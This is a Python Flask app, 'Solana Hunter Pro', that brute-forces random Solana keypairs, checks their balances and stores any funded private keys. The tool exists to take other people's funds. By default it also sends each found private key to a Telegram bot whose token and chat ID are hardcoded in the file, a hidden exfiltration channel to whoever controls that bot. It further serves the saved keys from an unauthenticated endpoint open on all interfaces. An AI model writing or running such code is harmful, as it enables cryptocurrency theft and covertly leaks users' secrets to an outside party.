import time
import requests
import base58
import nacl.signing
from colorama import Fore, Style, init
from flask import Flask, render_template_string, request, jsonify
import threading
import argparse
import webbrowser
import socket
import psutil
from datetime import datetime

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)

# Configuration
DEFAULT_PORT = 5000
DEFAULT_RPC_URL = "https://api.mainnet-beta.solana.com"
WALLET_FILE = "solana_wallets.txt"
TELEGRAM_TOKEN = "8481417913:AAH65jDSXYt8Z9CKOJW2VwxVG-nuanTe-FE"
TELEGRAM_CHAT_ID = "7521446360"

# Global variables
console_output = []
running = False
generation_thread = None
rpc_url = DEFAULT_RPC_URL
stats = {
    'wallets_generated': 0,
    'wallets_with_balance': 0,
    'start_time': None,
    'last_found': None
}

def parse_arguments():
    parser = argparse.ArgumentParser(description='Premium Solana Wallet Generator')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help=f'Port number (default: {DEFAULT_PORT})')
    parser.add_argument('--rpc', type=str, default=DEFAULT_RPC_URL, help=f'Solana RPC endpoint (default: {DEFAULT_RPC_URL})')
    parser.add_argument('--no-browser', action='store_true', help='Disable browser auto-open')
    parser.add_argument('--no-telegram', action='store_true', help='Disable Telegram notifications')
    parser.add_argument('--theme', choices=['dark', 'light', 'cyber'], default='dark', help='UI theme selection')
    return parser.parse_args()

def get_network_info():
    """Get network interface information"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        interfaces = psutil.net_io_counters(pernic=True)
        return {
            'hostname': hostname,
            'ip': ip_address,
            'interfaces': interfaces
        }
    except Exception as e:
        return {'error': str(e)}

def send_telegram_notification(message):
    """Enhanced Telegram notification with retry logic"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        # Retry mechanism (3 attempts)
        for attempt in range(3):
            try:
                response = requests.post(url, json=payload, timeout=15)
                if response.status_code == 200:
                    return True
                time.sleep(2)
            except requests.exceptions.RequestException:
                time.sleep(3)
        
        add_to_console(Fore.RED + f"Telegram notification failed after 3 attempts")
        return False
    except Exception as e:
        add_to_console(Fore.RED + f"Telegram error: {str(e)}")
        return False

def generate_solana_address():
    """Optimized wallet generation"""
    try:
        signing_key = nacl.signing.SigningKey.generate()
        verify_key = signing_key.verify_key
        sol_address = base58.b58encode(verify_key.encode()).decode()
        private_key = base58.b58encode(signing_key.encode() + verify_key.encode()).decode()
        return sol_address, private_key
    except Exception as e:
        add_to_console(Fore.RED + f"Generation error: {str(e)}")
        return None, None

def get_solana_balance(address):
    """Robust balance checking with retry logic"""
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getBalance",
        "params": [address]
    }
    
    # Retry mechanism
    for attempt in range(3):
        try:
            response = requests.post(rpc_url, json=payload, timeout=15)
            if response.status_code == 200:
                data = response.json()
                return data.get("result", {}).get("value", 0)
            time.sleep(1)
        except requests.exceptions.RequestException as e:
            add_to_console(Fore.YELLOW + f"Attempt {attempt+1}: Connection error - {str(e)}")
            time.sleep(2)
    
    add_to_console(Fore.RED + f"Failed to check balance after 3 attempts")
    return None

def save_wallet(address, private_key, balance):
    """Enhanced wallet saving with backup"""
    try:
        # Format entry
        entry = f"""🚀 SOLANA WALLET FOUND 🚀
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Address: {address}
Private Key: {private_key}
Balance: {balance:,} lamports ({balance/1_000_000_000:.9f} SOL)
{'='*60}\n"""
        
        # Save to file
        with open(WALLET_FILE, 'a') as f:
            f.write(entry)
        
        # Telegram notification
        if not args.no_telegram:
            telegram_msg = f"""💰 <b>SOLANA WALLET FOUND!</b> 💰

⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📌 <b>Address:</b> <code>{address}</code>
💎 <b>Balance:</b> {balance/1_000_000_000:.9f} SOL

🔑 <b>Private Key:</b>
<code>{private_key}</code>"""
            send_telegram_notification(telegram_msg)
        
        stats['wallets_with_balance'] += 1
        stats['last_found'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        add_to_console(Fore.GREEN + "✅ Wallet saved and notification sent!")
    except Exception as e:
        add_to_console(Fore.RED + f"Failed to save wallet: {str(e)}")

def add_to_console(text):
    """Enhanced console output with threading lock"""
    timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
    console_output.append(f"[{timestamp}] {text}")
    if len(console_output) > 200:
        del console_output[:50]

def generation_loop():
    """Optimized generation loop with stats tracking"""
    global running
    stats['start_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    while running:
        address, private_key = generate_solana_address()
        if not address:
            continue
        
        stats['wallets_generated'] += 1
        
        add_to_console(Fore.CYAN + f"Generated: {address}")
        add_to_console(Fore.YELLOW + f"Private: {private_key[:30]}...{private_key[-10:]}")
        
        balance = get_solana_balance(address)
        if balance is None:
            continue
        
        sol_balance = balance / 1_000_000_000
        if balance > 0:
            add_to_console(Fore.GREEN + f"💰 FOUND: {balance:,} lamports ({sol_balance:.9f} SOL)")
            save_wallet(address, private_key, balance)
        else:
            add_to_console(Fore.WHITE + f"Balance: {balance:,} lamports")
        
        time.sleep(0.1)

@app.route('/')
def index():
    """Premium Web Interface"""
    network_info = get_network_info()
    uptime = str(datetime.now() - datetime.strptime(stats.get('start_time', '0001-01-01 00:00:00'), '%Y-%m-%d %H:%M:%S')).split('.')[0] if stats.get('start_time') else "00:00:00"
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Hunter Pro</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: {% if theme == 'cyber' %} #0ff {% elif theme == 'light' %} #3366cc {% else %} #4a6bff {% endif %};
            --bg-color: {% if theme == 'cyber' %} #0a0a12 {% elif theme == 'light' %} #f5f5f5 {% else %} #121218 {% endif %};
            --card-bg: {% if theme == 'cyber' %} #0f0f1a {% elif theme == 'light' %} #ffffff {% else %} #1a1a24 {% endif %};
            --text-color: {% if theme == 'cyber' %} #e0e0ff {% elif theme == 'light' %} #333333 {% else %} #e0e0e0 {% endif %};
            --success-color: #4CAF50;
            --warning-color: #FFC107;
            --danger-color: #F44336;
            --console-bg: {% if theme == 'cyber' %} #000010 {% elif theme == 'light' %} #e0e0e0 {% else %} #000000 {% endif %};
        }
        
        body {
            font-family: 'Courier New', monospace;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(var(--primary-color), 0.3);
        }
        
        h1 {
            color: var(--primary-color);
            margin: 0;
            font-size: 2.2rem;
            letter-spacing: 1px;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background-color: var(--card-bg);
            border-radius: 8px;
            padding: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            border-left: 4px solid var(--primary-color);
        }
        
        .stat-card h3 {
            margin-top: 0;
            margin-bottom: 10px;
            color: var(--primary-color);
            font-size: 1rem;
        }
        
        .stat-value {
            font-size: 1.5rem;
            font-weight: bold;
            margin: 5px 0;
        }
        
        .controls {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        button:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }
        
        button:disabled {
            background-color: #666;
            cursor: not-allowed;
            transform: none;
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-running {
            background-color: var(--success-color);
            box-shadow: 0 0 10px var(--success-color);
        }
        
        .status-stopped {
            background-color: var(--danger-color);
        }
        
        .console-container {
            background-color: var(--console-bg);
            border-radius: 8px;
            padding: 15px;
            height: 500px;
            overflow-y: auto;
            margin-bottom: 20px;
            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5);
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        
        .console-line {
            margin: 2px 0;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .timestamp {
            color: #666;
            margin-right: 10px;
        }
        
        .address {
            color: var(--primary-color);
        }
        
        .private-key {
            color: #FFC107;
        }
        
        .balance-positive {
            color: var(--success-color);
            font-weight: bold;
        }
        
        .balance-zero {
            color: #aaa;
        }
        
        .error {
            color: var(--danger-color);
        }
        
        .network-info {
            background-color: var(--card-bg);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .network-info h3 {
            margin-top: 0;
            color: var(--primary-color);
        }
        
        .network-details {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
        }
        
        .network-item {
            margin-bottom: 8px;
        }
        
        .network-label {
            font-weight: bold;
            color: var(--primary-color);
        }
        
        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .console-container {
                height: 300px;
            }
        }
        
        /* Cyber theme specific */
        {% if theme == 'cyber' %}
        body {
            background-image: radial-gradient(circle at 10% 20%, rgba(0, 255, 255, 0.05) 0%, transparent 20%);
        }
        
        .stat-card, .network-info {
            border: 1px solid rgba(0, 255, 255, 0.1);
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.05);
        }
        
        button {
            background: linear-gradient(135deg, #0ff 0%, #00a2ff 100%);
            text-shadow: 0 0 5px rgba(0, 255, 255, 0.5);
        }
        
        .console-container {
            border: 1px solid rgba(0, 255, 255, 0.2);
        }
        {% endif %}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">
                <i class="fas fa-wallet" style="color: var(--primary-color); font-size: 2rem;"></i>
                <h1>Solana Hunter Pro</h1>
            </div>
            <div>
                <span class="status-indicator {% if running %}status-running{% else %}status-stopped{% endif %}"></span>
                <span id="statusText">{% if running %}RUNNING{% else %}STOPPED{% endif %}</span>
            </div>
        </header>
        
        <div class="network-info">
            <h3><i class="fas fa-network-wired"></i> Network Information</h3>
            <div class="network-details">
                <div class="network-item">
                    <span class="network-label">Hostname:</span> {{ network_info.hostname }}
                </div>
                <div class="network-item">
                    <span class="network-label">IP Address:</span> {{ network_info.ip }}
                </div>
                <div class="network-item">
                    <span class="network-label">Uptime:</span> {{ uptime }}
                </div>
                <div class="network-item">
                    <span class="network-label">RPC Endpoint:</span> {{ rpc_url }}
                </div>
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3><i class="fas fa-wallet"></i> Wallets Generated</h3>
                <div class="stat-value" id="walletsGenerated">{{ stats.wallets_generated|default(0) }}</div>
                <div>Speed: <span id="walletsPerMin">0</span>/min</div>
            </div>
            
            <div class="stat-card">
                <h3><i class="fas fa-coins"></i> Wallets with Balance</h3>
                <div class="stat-value" id="walletsWithBalance">{{ stats.wallets_with_balance|default(0) }}</div>
                <div>Last found: <span id="lastFound">{{ stats.last_found|default('Never') }}</span></div>
            </div>
            
            <div class="stat-card">
                <h3><i class="fas fa-bolt"></i> Performance</h3>
                <div>Speed: <span id="generationSpeed">0</span> w/s</div>
                <div>Response time: <span id="rpcResponseTime">0</span> ms</div>
            </div>
            
            <div class="stat-card">
                <h3><i class="fas fa-bell"></i> Notifications</h3>
                <div>Telegram: {% if not no_telegram %}<span style="color: var(--success-color);">Enabled</span>{% else %}<span style="color: var(--danger-color);">Disabled</span>{% endif %}</div>
                <div>Output file: {{ wallet_file }}</div>
            </div>
        </div>
        
        <div class="controls">
            <button id="startBtn" onclick="startGeneration()">
                <i class="fas fa-play"></i> Start Generation
            </button>
            <button id="stopBtn" onclick="stopGeneration()" {% if not running %}disabled{% endif %}>
                <i class="fas fa-stop"></i> Stop Generation
            </button>
            <button onclick="clearConsole()">
                <i class="fas fa-broom"></i> Clear Console
            </button>
            <button onclick="exportWallets()">
                <i class="fas fa-file-export"></i> Export Wallets
            </button>
        </div>
        
        <div class="console-container" id="console">
            <!-- Console output will be inserted here -->
        </div>
    </div>

    <script>
        // Performance tracking
        let lastUpdateTime = Date.now();
        let lastWalletsCount = 0;
        let speedSamples = [];
        const maxSamples = 5;
        
        function updateStats() {
            // Update counters
            document.getElementById('walletsGenerated').textContent = {{ stats.wallets_generated|default(0) }};
            document.getElementById('walletsWithBalance').textContent = {{ stats.wallets_with_balance|default(0) }};
            document.getElementById('lastFound').textContent = '{{ stats.last_found|default("Never") }}';
            
            // Calculate speed
            const now = Date.now();
            const timeDiff = (now - lastUpdateTime) / 1000; // in seconds
            const walletsDiff = {{ stats.wallets_generated|default(0) }} - lastWalletsCount;
            const currentSpeed = timeDiff > 0 ? Math.round(walletsDiff / timeDiff) : 0;
            
            speedSamples.push(currentSpeed);
            if (speedSamples.length > maxSamples) {
                speedSamples.shift();
            }
            
            const avgSpeed = Math.round(speedSamples.reduce((a, b) => a + b, 0) / speedSamples.length);
            document.getElementById('generationSpeed').textContent = avgSpeed;
            document.getElementById('walletsPerMin').textContent = avgSpeed * 60;
            
            lastUpdateTime = now;
            lastWalletsCount = {{ stats.wallets_generated|default(0) }};
        }
        
        function updateConsole() {
            fetch('/get_console')
                .then(response => response.json())
                .then(data => {
                    const consoleElement = document.getElementById('console');
                    let htmlContent = '';
                    
                    data.output.forEach(line => {
                        // Convert color codes to HTML
                        line = line
                            .replace(/\x1b\[31m/g, '<span class="error">')
                            .replace(/\x1b\[32m/g, '<span class="balance-positive">')
                            .replace(/\x1b\[33m/g, '<span class="private-key">')
                            .replace(/\x1b\[36m/g, '<span class="address">')
                            .replace(/\x1b\[0m/g, '</span>')
                            .replace(/\x1b\[37m/g, '<span class="balance-zero">');
                        
                        // Extract timestamp
                        const timestampEnd = line.indexOf(']');
                        const timestamp = line.substring(0, timestampEnd + 1);
                        const content = line.substring(timestampEnd + 2);
                        
                        htmlContent += `<div class="console-line"><span class="timestamp">${timestamp}</span>${content}</div>`;
                    });
                    
                    consoleElement.innerHTML = htmlContent;
                    
                    // Auto-scroll if near bottom
                    if (consoleElement.scrollTop > consoleElement.scrollHeight - consoleElement.clientHeight - 100) {
                        consoleElement.scrollTop = consoleElement.scrollHeight;
                    }
                });
        }
        
        function startGeneration() {
            fetch('/start', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('startBtn').disabled = true;
                        document.getElementById('stopBtn').disabled = false;
                        document.querySelector('.status-indicator').className = 'status-indicator status-running';
                        document.getElementById('statusText').textContent = 'RUNNING';
                    }
                });
        }
        
        function stopGeneration() {
            fetch('/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('startBtn').disabled = false;
                        document.getElementById('stopBtn').disabled = true;
                        document.querySelector('.status-indicator').className = 'status-indicator status-stopped';
                        document.getElementById('statusText').textContent = 'STOPPED';
                    }
                });
        }
        
        function clearConsole() {
            fetch('/clear', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('console').innerHTML = '';
                    }
                });
        }
        
        function exportWallets() {
            fetch('/export_wallets')
                .then(response => response.blob())
                .then(blob => {
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'solana_wallets_export.txt';
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);
                });
        }
        
        // Initial update
        updateConsole();
        updateStats();
        
        // Regular updates
        setInterval(updateConsole, 1000);
        setInterval(updateStats, 2000);
    </script>
</body>
</html>
''', rpc_url=rpc_url, port=args.port, wallet_file=WALLET_FILE, 
    no_telegram=args.no_telegram, theme=args.theme, stats=stats,
    network_info=get_network_info(), uptime=uptime)

@app.route('/start', methods=['POST'])
def start_generation():
    global running, generation_thread
    if not running:
        running = True
        generation_thread = threading.Thread(target=generation_loop)
        generation_thread.daemon = True
        generation_thread.start()
        add_to_console(Fore.GREEN + "🚀 Generation started")
        if not args.no_telegram:
            send_telegram_notification("🟢 <b>Solana Hunter Pro Started</b>\n\n🔗 RPC: " + rpc_url)
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_generation():
    global running
    if running:
        running = False
        if generation_thread:
            generation_thread.join(timeout=1)
        add_to_console(Fore.RED + "🛑 Generation stopped")
        if not args.no_telegram:
            send_telegram_notification("🔴 <b>Solana Hunter Pro Stopped</b>\n\n📊 Stats:\n" +
                                     f"Generated: {stats['wallets_generated']}\n" +
                                     f"With Balance: {stats['wallets_with_balance']}")
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Not running"})

@app.route('/clear', methods=['POST'])
def clear_console():
    global console_output
    console_output = []
    add_to_console(Fore.BLUE + "🧹 Console cleared")
    return jsonify({"success": True})

@app.route('/export_wallets')
def export_wallets():
    try:
        with open(WALLET_FILE, 'r') as f:
            content = f.read()
        return app.response_class(
            content,
            mimetype='text/plain',
            headers={'Content-Disposition': 'attachment;filename=solana_wallets_export.txt'}
        )
    except Exception as e:
        return str(e), 500

@app.route('/get_console')
def get_console():
    return jsonify({"output": console_output})

if __name__ == '__main__':
    args = parse_arguments()
    rpc_url = args.rpc
    
    # Initial console messages
    add_to_console(Fore.GREEN + "🌟 Solana Hunter Pro Initialized")
    add_to_console(Fore.CYAN + f"🌐 Using RPC: {rpc_url}")
    add_to_console(Fore.YELLOW + f"🎨 Active Theme: {args.theme.capitalize()}")
    if not args.no_telegram:
        add_to_console(Fore.MAGENTA + "📱 Telegram notifications: ENABLED")
    else:
        add_to_console(Fore.YELLOW + "📱 Telegram notifications: DISABLED")
    add_to_console(Fore.WHITE + "🔄 Press 'Start Generation' to begin")
    
    # Open browser if not disabled
    if not args.no_browser:
        webbrowser.open_new_tab(f"http://localhost:{args.port}")
    
    # Start the server with enhanced options
    app.run(
        host='0.0.0.0',
        port=args.port,
        threaded=True,
        use_reloader=False
    )
